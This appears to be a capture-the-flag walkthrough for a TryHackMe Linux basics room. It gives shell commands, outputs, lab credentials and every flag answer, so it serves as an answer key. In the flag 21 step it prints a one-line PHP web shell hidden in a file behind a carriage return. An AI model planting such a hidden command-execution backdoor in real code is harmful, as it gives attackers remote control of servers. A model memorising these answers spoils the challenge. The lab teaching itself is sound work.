#  Linux Challenges

Learn by completing linux challenges.

#  [Task 1] Linux Challenges Introduction

This rooms purpose is to learn or improve your Linux skills.

There will be challenges that will involve you using the following commands and techniques:

* Using commands such as: `ls`, `grep`, `cd`, `tail`, `head`, `curl`, `strings`, `tmux`, `find`, `locate`, `diff`, `tar`, `xxd`
* Understanding cronjobs, MOTD's and system mounts
* SSH'ing to other users accounts using a password and private key
* Locating files on the system hidden in different directories
* Encoding methods (base64, hex)
* MySQL database interaction
* Using SCP to download a file
* Understanding Linux system paths and system variables
* Understanding file permissions
* Using RDP for a GUI

Deploy the virtual machine attached to this task to get started.

If you wanted to manually SSH into the box, please [connect to our network](https://tryhackme.com/access).

## #1.1 	

**Instrcutions**

Deploy the virtual machine.

If you want to manually SSH into the machine, use the following credentials:

* Username: garry
* Password: letmein

How many visible files can you see in garrys home directory?

*Hint: If you don't have an SSH client pre-installed, we recommend using PuTTY to SSH into the machine.*

**Answer**

~~~
$ ls -l
total 20
-rw-rw-r-- 1 garry ubuntu  190 Feb 19  2019 flag1.txt
-rwxrwxr-x 1 garry ubuntu 8656 Feb 20  2019 flag24
-rw-rw-r-- 1 garry ubuntu 3589 Feb 20  2019 flag29
garry@ip-10-10-167-164:~$ ls | wc -l
3
~~~

Answer: `3`

# [Task 2] The Basics

## #2.0 - Instructions

This set of tasks will go over the basic linux commands.

Each question might require you to switch between another user to find the answer!

## #2.1 - What is flag 1?

*Hint: The first flag can be found in garry's home directory! Your job is to find out how to read the file.*

~~~
$ cat flag1.txt 
There are flags hidden around the file system, its your job to find them.

Flag 1: f40dc0cff080ad38a6ba9a1c2c038b2c

Log into bobs account to get flag 2.

Username: bob
Password: linuxrules
~~~

Answer: `f40dc0cff080ad38a6ba9a1c2c038b2c`

## #2.2 - Log into bob's account using the credentials shown in flag 1. What is flag 2?

*Hint: You can change users by using the "su" command.*

Let's change user:

~~~
$ su - bob
Password: 
bob@ip-10-10-167-164:~$ whoami
bob
~~~

Now let's list the files and cat flag2:

~~~
$ ls -l
total 48
drwxr-xr-x 2 bob bob 4096 Feb 19  2019 Desktop
drwxr-xr-x 2 bob bob 4096 Feb 19  2019 Documents
drwxr-xr-x 2 bob bob 4096 Feb 19  2019 Downloads
drwxrwxr-x 2 bob bob 4096 Feb 18  2019 flag13
-rw-rw-r-- 1 bob bob   65 Feb 20  2019 flag21.php
-rw-rw-r-- 1 bob bob   41 Feb 18  2019 flag2.txt
-rw-rw-r-- 1 bob bob  149 Feb 18  2019 flag8.tar.gz
drwxr-xr-x 2 bob bob 4096 Feb 19  2019 Music
drwxr-xr-x 2 bob bob 4096 Feb 19  2019 Pictures
drwxr-xr-x 2 bob bob 4096 Feb 19  2019 Public
drwxr-xr-x 2 bob bob 4096 Feb 19  2019 Templates
drwxr-xr-x 2 bob bob 4096 Feb 19  2019 Videos
bob@ip-10-10-167-164:~$ cat flag2.txt 
Flag 2: 8e255dfa51c9cce67420d2386cede596
~~~

Answer: `8e255dfa51c9cce67420d2386cede596`

## #2.3 - Flag 3 is located where bob's bash history gets stored.

The bash history is located under `~/.bash_history`:

~~~
bob@ip-10-10-167-164:~$ cat .bash_history 
9daf3281745c2d75fc6e992ccfdedfcd
cat ~/.bash_history 
rm ~/.bash_history
vim ~/.bash_history
exit
ls
crontab -e
ls
cd /home/alice/
ls
cd .ssh
ssh -i .ssh/id_rsa alice@localhost
exit
ls
cd ../alice/
cat .ssh/id_rsa
cat /home/alice/.ssh/id_rsa
exit
cat ~/.bash_history 
exit
~~~

Answer: `9daf3281745c2d75fc6e992ccfdedfcd`

## #2.4 - Flag 4 is located where cron jobs are created.

*Hint: crontab*

You can list cronjobs with `crontab -l`:

~~~
$ crontab -l | grep -v '^\s*$\|^\s*\#'
0 6 * * * echo 'flag4:dcd5d1dcfac0578c99b7e7a6437827f3' > /home/bob/flag4.txt
~~~

There is a cronjob that echoes the flag to bob's home.

Answer: `dcd5d1dcfac0578c99b7e7a6437827f3`

## #2.5 - Find and retrieve flag 5.

*Hint: Use the find command*

Let's search for `flag5.txt`. You can append `2>/dev/null` to the command to get rid of the `Permission denied` errors.

~~~
bob@ip-10-10-167-164:~$ find / -name flag5.txt 2>/dev/null
/lib/terminfo/E/flag5.txt
bob@ip-10-10-167-164:~$ cat /lib/terminfo/E/flag5.txt
bd8f33216075e5ba07c9ed41261d1703
~~~

## #2.6 - "Grep" through flag 6 and find the flag. The first 2 characters of the flag is c9.

Let's first search where flag6.txt is located:

~~~
$ find / -name flag6.txt 2>/dev/null
/home/flag6.txt
~~~

We know that flags are MD5 hashes, which are 32 bytes long. Let's use a regular expression to extract the flag:

~~~
$ grep -o "[a-z0-9]\{32\}" /home/flag6.txt 
c9e142a1e25b24a837b98db589b08be5
~~~

## #2.7 - Look at the systems processes. What is flag 7.

Let's list all processes with `ps aux` and filter the result with `grep` to only match `flag7`:

~~~
10-10-167-164:/home$ ps aux | grep flag7
root      1382  0.0  0.0   6008   372 ?        S    11:43   0:00 flag7:274adb75b337307bd57807c005ee6358 1000000
~~~

One process (pid 1382) is matching. The flag is `274adb75b337307bd57807c005ee6358`.

## #2.8 - De-compress and get flag 8.

Search flag8 and uncompress the tar archive.

~~~
bob@ip-10-10-167-164:/home$ find / -name flag8* 2>/dev/null
/home/bob/flag8.tar.gz
bob@ip-10-10-167-164:/home$ cd /home/bob/
bob@ip-10-10-167-164:~$ tar xzvf flag8.tar.gz 
flag8.txt
bob@ip-10-10-167-164:~$ cat flag8.txt 
75f5edb76fe98dd5fc9f577a3f5de9bc
~~~

## #2.9 - By look in your hosts file, locate and retrieve flag 9.

The hosts file is located under `/etc`:

~~~
bob@ip-10-10-167-164:~$ cat /etc/hosts
127.0.0.1 localhost

# The following lines are desirable for IPv6 capable hosts
::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts

127.0.0.1	dcf50ad844f9fe06339041ccc0d6e280.com
~~~

An entry is defined to make `dcf50ad844f9fe06339041ccc0d6e280.com` point to localhost (`127.0.0.1`)

Answer: `dcf50ad844f9fe06339041ccc0d6e280`

## #2.10 - Find all other users on the system. What is flag 10.

*Hint: /etc/passwd*

~~~
$ grep -o "[a-zA-Z0-9]\{32\}" /etc/passwd
5e23deecfe3a7292970ee48ff1b6d00c
5e23deecfe3a7292970ee48ff1b6d00c
~~~

# [Task 3] Linux Functionality

## #3.0 - Instructions

Now we have used the basic Linux commands to find the first 10 flags, we will move onto using more functions that Linux has to offer.

Update: alice's private ssh key doesn't work. Her password is: TryHackMe123

## #3.1 - Run the command flag11. Locate where your command alias are stored and get flag 11.

Let's check what is defined in `~/.bashrc`:

~~~
bob@ip-10-10-167-164:/home/ubuntu$ grep flag11 .bashrc 
alias flag11='echo "You need to look where the alias are created..."' #b4ba05d85801f62c4c0d05d3a76432e0
~~~

Answer: `b4ba05d85801f62c4c0d05d3a76432e0`

## #3.2 - Flag12 is located were MOTD's are usually found on an Ubuntu OS. What is flag12?

MOTD refers to Message of the Day. On Ubuntu, this is a process that has it's configuration files under `/etc/update-motd.d`.

~~~
bob@ip-10-10-167-164:/etc/update-motd.d$ ls -l /etc/update-motd.d/
total 40
-rwxr-xr-x 1 root root 1177 Feb 18  2019 00-header
-rwxr-xr-x 1 root root 1157 Jun 14  2016 10-help-text
-rwxr-xr-x 1 root root  334 Nov 14  2018 51-cloudguest
-rwxr-xr-x 1 root root   97 May 24  2016 90-updates-available
-rwxr-xr-x 1 root root  299 Jul 22  2016 91-release-upgrade
-rwxr-xr-x 1 root root  111 Oct  1  2018 97-overlayroot
-rwxr-xr-x 1 root root  142 May 24  2016 98-fsck-at-reboot
-rwxr-xr-x 1 root root  144 May 24  2016 98-reboot-required
-rwxr-xr-x 1 root root  604 Nov  5  2017 99-esm
-rw-r--r-- 1 root root 1224 Feb 18  2019 logo.txt
bob@ip-10-10-167-164:/etc/update-motd.d$ grep -i flag12 *
00-header:# Flag12: 01687f0c5e63382f1c9cc783ad44ff7f
~~~

Answer: `01687f0c5e63382f1c9cc783ad44ff7f`

## #3.3 - Find the difference between two script files to find flag 13.

*Hint: The command "diff" might come in handy.*

~~~
bob@ip-10-10-167-164:/etc/update-motd.d$ find / -name flag13* 2>/dev/null
/home/bob/flag13
bob@ip-10-10-167-164:/etc/update-motd.d$ ls -l /home/bob/flag13/
total 480
-rw-rw-r-- 1 bob bob 243323 Feb 18  2019 script1
-rw-rw-r-- 1 bob bob 243356 Feb 18  2019 script2
bob@ip-10-10-167-164:/etc/update-motd.d$ cd /home/bob/flag13/
bob@ip-10-10-167-164:~/flag13$ diff script1 script2 
2437c2437
< Lightoller sees Smith walking stiffly toward him and quickly goes to him. He yells into the Captain's ear, through cupped hands, over the roar of the steam... 
---
> Lightoller sees 3383f3771ba86b1ed9ab7fbf8abab531 Smith walking stiffly toward him and quickly goes to him. He yells into the Captain's ear, through cupped hands, over the roar of the steam... 
~~~

Answer: `3383f3771ba86b1ed9ab7fbf8abab531`

## #3.4 - Where on the file system are logs typically stored? Find flag 14.

~~~
bob@ip-10-10-167-164:/var/log$ ls -l /var/log/
total 4276
-rw-r--r-- 1 root              root       0 Mar  7  2019 alternatives.log
-rw-r--r-- 1 root              root   27798 Feb 19  2019 alternatives.log.1
drwxr--r-x 3 root              root    4096 Feb 18  2019 amazon
drwxr-x--- 2 root              adm     4096 May 14 11:48 apache2
drwxr-xr-x 2 root              root    4096 Mar  7  2019 apt
-rw-r----- 1 syslog            adm     1048 May 14 12:59 auth.log
-rw-r----- 1 syslog            adm    20767 May 14 11:46 auth.log.1
-rw-r----- 1 syslog            adm   108997 Mar  7  2019 auth.log.2.gz
-rw-rw---- 1 root              utmp       0 May 14 11:48 btmp
-rw------- 1 root              utmp    1536 Mar  7  2019 btmp.1
-rw-r--r-- 1 syslog            adm  1732425 May 14 11:43 cloud-init.log
-rw-r--r-- 1 root              root   34258 May 14 11:43 cloud-init-output.log
drwxr-xr-x 2 root              root    4096 May 14 11:48 cups
drwxr-xr-x 2 root              root    4096 Apr  9  2018 dist-upgrade
-rw-r--r-- 1 root              root       0 Mar  7  2019 dpkg.log
-rw-r--r-- 1 root              root 1028634 Feb 20  2019 dpkg.log.1
-rwxr-xr-x 1 root              root  518561 Feb 18  2019 flagtourteen.txt
-rw-r--r-- 1 root              root    3878 Feb 19  2019 fontconfig.log
drwxr-xr-x 2 root              root    4096 Nov 14  2018 fsck
drwx--x--x 2 root              gdm     4096 Aug 21  2018 gdm3
-rw-r--r-- 1 root              root    1852 May 14 11:43 gpu-manager.log
drwxr-xr-x 3 root              root    4096 Feb 19  2019 hp
-rw-r----- 1 syslog            adm        0 May 14 11:48 kern.log
-rw-r----- 1 syslog            adm    59887 May 14 11:43 kern.log.1
-rw-r----- 1 syslog            adm   129102 Mar  7  2019 kern.log.2.gz
-rw-rw-r-- 1 root              utmp  293460 May 14 11:46 lastlog
drwxr-xr-x 2 root              root    4096 Dec  7  2017 lxd
drwxr-x--- 2 mysql             adm     4096 May 14 11:48 mysql
drwx------ 2 speech-dispatcher root    4096 Feb 18  2016 speech-dispatcher
-rw-r----- 1 syslog            adm    11645 May 14 13:14 syslog
-rw-r----- 1 syslog            adm   203686 May 14 11:48 syslog.1
-rw-r----- 1 syslog            adm    88971 Mar  7  2019 syslog.2.gz
-rw-r----- 1 syslog            adm   176687 Feb 20  2019 syslog.3.gz
drwxr-x--- 2 root              adm     4096 May 14 11:48 unattended-upgrades
-rw-rw-r-- 1 root              utmp       0 May 14 11:48 wtmp
-rw-rw-r-- 1 root              utmp    5376 May 14 11:46 wtmp.1
-rw-r--r-- 1 root              root   33247 May 14 11:43 Xorg.0.log
-rw-r--r-- 1 root              root   33980 Mar  7  2019 Xorg.0.log.old
-rw------- 1 root              root   23063 May 14 11:43 xrdp-sesman.log
bob@ip-10-10-167-164:/var/log$ wc -l flagtourteen.txt 
2701 flagtourteen.txt
bob@ip-10-10-167-164:/var/log$ grep -o "[a-zA-Z0-9]\{32\}" flagtourteen.txt 
71c3a8ad9752666275dadf62a93ef393
~~~

## #3.5 - Can you find information about the system, such as the kernel version etc. Find flag 15.

*Hint: *release*

~~~
bob@ip-10-10-167-164:/var/log$ cd /etc/
bob@ip-10-10-167-164:/etc$ ll | grep release
-rw-r--r--   1 root root     146 Feb 18  2019 lsb-release
lrwxrwxrwx   1 root root      21 Jul 17  2018 os-release -> ../usr/lib/os-release
bob@ip-10-10-167-164:/etc$ cat /etc/os-release 
NAME="Ubuntu"
VERSION="16.04.5 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.5 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
bob@ip-10-10-167-164:/etc$ cat /etc/lsb-release 
FLAG_15=a914945a4b2b5e934ae06ad6f9c6be45
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.5 LTS"
~~~

Answer: `a914945a4b2b5e934ae06ad6f9c6be45`

## #3.6 - Flag 16 lies within another system mount.

Nothing under `/mnt`:

~~~
bob@ip-10-10-167-164:/$ ls -la /mnt/
total 8
drwxr-xr-x  2 root root 4096 Nov 14  2018 .
drwxr-xr-x 23 root root 4096 May 14 11:43 ..
~~~

What about `/media`:

~~~
bob@ip-10-10-167-164:/$ ls -la /media/
total 12
drwxr-xr-x  3 root root 4096 Feb 18  2019 .
drwxr-xr-x 23 root root 4096 May 14 11:43 ..
drwxr-xr-x  3 root root 4096 Feb 18  2019 f
bob@ip-10-10-167-164:/$ cd /media/f/l/a/g/1/6/is/cab4b7cae33c87794d82efa1e7f834e6/
bob@ip-10-10-167-164:/media/f/l/a/g/1/6/is/cab4b7cae33c87794d82efa1e7f834e6$ ll
total 12
drwxr-xr-x 2 root root 4096 Feb 18  2019 ./
drwxr-xr-x 3 root root 4096 Feb 18  2019 ../
-rw-r--r-- 1 root root   28 Feb 18  2019 test.txt
bob@ip-10-10-167-164:/media/f/l/a/g/1/6/is/cab4b7cae33c87794d82efa1e7f834e6$ cat test.txt 
Where does this link to ey?
~~~

Answer: `cab4b7cae33c87794d82efa1e7f834e6`

## #3.7 - Login to alice's account using her private key and get flag 17.

*Hint: Are Alice's private keys permissions correct? /home/alice/.ssh/... Download her private key, fix its permission errors and SSH into her account.*

Let's switch to Alice (password `TryHackMe123` is provided in the instructions):

~~~
bob@ip-10-10-167-164:~$ su - alice
Password: 
alice@ip-10-10-167-164:~$ whoami
alice
alice@ip-10-10-167-164:~$ cat flag17 
89d7bce9d0bab49e11e194b54a601362
~~~

## #3.8 - Find the hidden flag 18.

Files which name are suffixed with dot are hidden. To view all files, use `ls` with the `-a` flag:

~~~
alice@ip-10-10-167-164:~$ ls | grep flag18
alice@ip-10-10-167-164:~$ ls -a | grep flag18
.flag18
alice@ip-10-10-167-164:~$ ls -la | grep flag18
-rw-rw-r-- 1 alice alice    33 Feb 18  2019 .flag18
alice@ip-10-10-167-164:~$ cat .flag18 
c6522bb26600d30254549b6574d2cef2
~~~

## #3.9 - Read the 2345th line of the file that contains flag 19.

*Hint: The sed command can help you with this.*

`flag19` has 3001 lines. To show the content of a specific line number, use `sed -n <line>p <file>`:

~~~
alice@ip-10-10-167-164:~$ wc -l flag19 
3001 flag19
alice@ip-10-10-167-164:~$ sed -n 2345p flag19 
490e69bd1bf3fc736cce9ff300653a3b
~~~

# [Task 4] Data Representation, Strings and Permissions

## #4.0 - Instructions

This set of tasks will require you to understand how certain data is represented on a Linux system. This section may require you to do some independent research.

## #4.1 - Find and retrieve flag 20.

*Hint: Its base64 encoded.*

~~~
alice@ip-10-10-167-164:~$ cat flag20 
MDJiOWFhYjhhMjk5NzBkYjA4ZWM3N2FlNDI1ZjZlNjg=
alice@ip-10-10-167-164:~$ cat flag20 | base64 -d
02b9aab8a29970db08ec77ae425f6e68
~~~

## #4.2 - Inspect the flag21.php file. Find the flag.

*Hint: Jump to Question #5 if you get stuck on this one.*

Let's find `flag21.php` and see what it contains:

~~~
alice@ip-10-10-167-164:~$ find / -name flag21.php 2>/dev/null
/home/bob/flag21.php
alice@ip-10-10-167-164:~$ cat /home/bob/flag21.php 
<?='MoreToThisFileThanYouThink';?>
~~~

The indication let us know that there is a hidden content. Let's use `cat` with the `-A` flag to show all:

~~~
$ cat -A flag21.php 
<?=`$_POST[flag21_g00djob]`?>^M<?='MoreToThisFileThanYouThink';?>$
~~~

Answer: `g00djob`

## #4.3 - Locate and read flag 22. Its represented as hex.

*Hint: Use xxd to convert hex to ascii.*

~~~
alice@ip-10-10-167-164:/home/bob$ find / -name flag22* 2>/dev/null
/home/alice/flag22
alice@ip-10-10-167-164:/home/bob$ cat /home/alice/flag22 
39 64 31 61 65 38 64 35 36 39 63 38 33 65 30 33 64 38 61 38 66 36 31 35 36 38 61 30 66 61 37 64
~~~

It's a serie of hex, that can be converted to ASCII characters with xxd:

~~~
alice@ip-10-10-167-164:/home/bob$ xxd -r -p /home/alice/flag22 
9d1ae8d569c83e03d8a8f61568a0fa7d
~~~

## #4.4 - Locate, read and reverse flag 23.

~~~
alice@ip-10-10-167-164:/home/bob$ find / -name flag23* 2>/dev/null
/home/alice/flag23
alice@ip-10-10-167-164:/home/bob$ cat /home/alice/flag23 
5ffb258330b8437a090c4f66507925ae
alice@ip-10-10-167-164:/home/bob$ cat /home/alice/flag23 | rev
ea52970566f4c090a7348b033852bff5
~~~

## #4.5 - Analyse the flag 24 compiled C program. Find a command that might reveal human readable strings when looking in the source code.

*Hint: Which user can access this flag?*

flag24 is an executable. When run, it doesn't reveal the flag:

~~~
alice@ip-10-10-167-164:~$ find / -name flag24* 2>/dev/null
/home/garry/flag24
alice@ip-10-10-167-164:~$ file /home/garry/flag24 
/home/garry/flag24: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d88e59a01b68aa0969e59bb68726cd7bf8ded9bf, not stripped
alice@ip-10-10-167-164:~$ cd /home/garry/
alice@ip-10-10-167-164:/home/garry$ ./flag24 
Nothing to see here!!
~~~

Let's see if there is a MD5 in it:

~~~
alice@ip-10-10-167-164:/home/garry$ 
alice@ip-10-10-167-164:/home/garry$ strings flag24 | grep -o "[a-zA-Z0-9]\{32\}"
~~~

No, let's see if something matches the string `flag`

~~~
alice@ip-10-10-167-164:/home/garry$ strings flag24 | grep flag
flag24.c
flag_24_is_hidd3nStr1ng
~~~

Answer: `hidd3nStr1ng`

## #4.6 - Flag 25 does not exist.

Indeed, unless it is hidden somewhere.

## #4.7 - Find flag 26 by searching the all files for a string that begins with 4bceb and is 32 characters long. 

~~~
$ find / -xdev -type f -print0 2>/dev/null | xargs -0 grep -o "4bceb[a-z0-9]\{27\}" 2>/dev/null
/var/cache/apache2/mod_cache_disk/config.json:4bceb76f490b24ed577d704c24d6955d
/var/lib/apt/lists/eu-west-1.ec2.archive.ubuntu.com_ubuntu_dists_xenial-updates_universe_source_Sources:4bceb7478970c3734d3f88abe05d906c
/var/lib/apt/lists/security.ubuntu.com_ubuntu_dists_xenial-security_universe_binary-amd64_Packages:4bcebdc83725e9160e5cc92bc374132e
/var/lib/apt/lists/eu-west-1.ec2.archive.ubuntu.com_ubuntu_dists_xenial_universe_source_Sources:4bceb0b82aa14467c3ba51a42eaa01de
/var/lib/apt/lists/eu-west-1.ec2.archive.ubuntu.com_ubuntu_dists_xenial-updates_universe_binary-amd64_Packages:4bcebdc83725e9160e5cc92bc374132e
/var/lib/apt/lists/security.ubuntu.com_ubuntu_dists_xenial-security_universe_source_Sources:4bceb7478970c3734d3f88abe05d906c
/var/lib/apt/lists/eu-west-1.ec2.archive.ubuntu.com_ubuntu_dists_xenial_universe_binary-amd64_Packages:4bceb44676e0d41cc281e25c4da8307d
/var/lib/apt/lists/eu-west-1.ec2.archive.ubuntu.com_ubuntu_dists_xenial_universe_binary-amd64_Packages:4bcebb81ef9681151bfd47d3578049a4
/var/lib/apt/lists/eu-west-1.ec2.archive.ubuntu.com_ubuntu_dists_xenial_universe_binary-amd64_Packages:4bcebfe0b9ee99daf79403c7293f460f
^C
~~~

Answer: `4bceb76f490b24ed577d704c24d6955d`

## #4.8 - Locate and retrieve flag 27, which is owned by the root user.

*Hint: What commands can you run as root? "sudo -l"*

Let's search for flag27:

~~~
alice@ip-10-10-167-164:/$ find / -name flag27* -user root -type f 2>/dev/null
/home/flag27
alice@ip-10-10-167-164:/$ cat /home/flag27 
cat: /home/flag27: Permission denied
alice@ip-10-10-167-164:/$ ls -l /home/flag27 
-rwx------ 1 root root 33 Feb 19  2019 /home/flag27
~~~

Unfortunately, we don't have permission to read the file because only root can access it. Let's list our privileges:

~~~
alice@ip-10-10-167-164:/$ sudo -l
Matching Defaults entries for alice on ip-10-10-167-164.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on ip-10-10-167-164.eu-west-1.compute.internal:
    (ALL) NOPASSWD: /bin/cat /home/flag27
~~~

By chance, we can execute `/bin/cat /home/flag27` as `root` without password, via `sudo`:

~~~
alice@ip-10-10-167-164:/$ sudo /bin/cat /home/flag27 
6fc0c805702baebb0ecc01ae9e5a0db5
~~~

## #4.9 - Whats the linux kernel version?

~~~
alice@ip-10-10-167-164:/$ uname -r
4.4.0-1075-aws
~~~

## #4.10

**Instructions**

Find the file called flag 29 and do the following operations on it:

1. Remove all spaces in file.
2. Remove all new line spaces.
3. Split by comma and get the last element in the split.

*Hint: sed, what user created this file?*

**Answer**

The cut command can only display the selected field by number, it seems there is no option to select the last field. However, reversing (`rev`) both before and after `cut -f1` works

~~~
alice@ip-10-10-167-164:/$ find / -name flag29* 2>/dev/null
/home/garry/flag29
alice@ip-10-10-167-164:/$ cat /home/garry/flag29 | sed "s/\s//g" | tr -d "\n" | rev | cut -d "," -f1 | rev
fastidiisuscipitmeaei.
~~~

# [Task 5] SQL, FTP, Groups and RDP

## #5.0 - Instructions

This task will have you finding flags in an SQL database, downloading files from the file system to your local system and more!

## #5.1 - Use curl to find flag 30.

*Hint: Do you have any services running on localhost?*

~~~
$ curl 127.0.0.1
flag30:fe74bb12fe03c5d8dfc245bdd1eae13f
~~~

## #5.2 - Flag 31 is a MySQL database name. MySQL username: `root`, MySQL password: `hello`

~~~
alice@ip-10-10-167-164:/$ mysql -u root -p -e "show databases"
Enter password: 
+-------------------------------------------+
| Database                                  |
+-------------------------------------------+
| information_schema                        |
| database_2fb1cab13bf5f4d61de3555430c917f4 |
| mysql                                     |
| performance_schema                        |
| sys                                       |
+-------------------------------------------+
~~~

Answer: `2fb1cab13bf5f4d61de3555430c917f4`

## #5.3 - Bonus flag question, get data out of the table from the database you found above!

~~~
alice@ip-10-10-167-164:/$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 5.7.25-0ubuntu0.16.04.2 (Ubuntu)

Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use database_2fb1cab13bf5f4d61de3555430c917f4;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------------------------------------------+
| Tables_in_database_2fb1cab13bf5f4d61de3555430c917f4 |
+-----------------------------------------------------+
| flags                                               |
+-----------------------------------------------------+
1 row in set (0.00 sec)

mysql> select * from flags;
+----+----------------------------------+
| id | flag                             |
+----+----------------------------------+
|  1 | ee5954ee1d4d94d61c2f823d7b9d733c |
+----+----------------------------------+
1 row in set (0.00 sec)
~~~

Answer: `ee5954ee1d4d94d61c2f823d7b9d733c`

## #5.4 - Using SCP, FileZilla or another FTP client download flag32.mp3 to reveal flag 32.

First locate the flag:

~~~
alice@ip-10-10-167-164:/$ find / -name flag32.mp3 2>/dev/null
/home/alice/flag32.mp3
~~~

Now, get the file (command to run on your machine):

~~~
$ sshpass -p "TryHackMe123" scp -r alice@10.10.167.164:flag32.mp3 .
~~~

Listen to the file. It says: `Try hack Me 13 37`

Answer: `tryhackme1337`

## #5.5 - Flag 33 is located where your personal $PATH's are stored.

~~~
$ find /home -name .profile -print0 2>/dev/null | xargs -0 grep -i "flag" 2>/dev/null
/home/bob/.profile:#Flag 33: 547b6ceee3c5b997b625de99b044f5cf
~~~

## #5.6 - Switch your account back to bob. Using system variables, what is flag34?

*Hint: echo $flag34*

Switch back to bob (password: `linuxrules`) and print bob's environment variables.

~~~
alice@ip-10-10-167-164:/home$ su - bob
Password: 
bob@ip-10-10-167-164:~$ printenv | grep flag
flag34=7a88306309fe05070a7c5bb26a6b2def
~~~

## #5.7 - Look at all groups created on the system. What is flag 35?

~~~
bob@ip-10-10-167-164:/etc$ cat /etc/group | grep flag
flag35_769afb6:x:1005:
~~~

Answer: `769afb6`

## #5.8 - Find the user which is apart of the "hacker" group and read flag 36.

Only `bob` seems to be part of hthe `hacker` group:

~~~
bob@ip-10-10-167-164:/etc$ grep "hacker" /etc/group
hacker:x:1004:bob
~~~

As we are bob, we are allowed to access files that are owned by the group. Let's use `find` to list all files owned by the group `hacker`.

~~~
bob@ip-10-10-167-164:~$ find / -group hacker 2>/dev/null
/etc/flag36
bob@ip-10-10-167-164:~$ cat /etc/flag36 
83d233f2ffa388e5f0b053848caed1eb
~~~
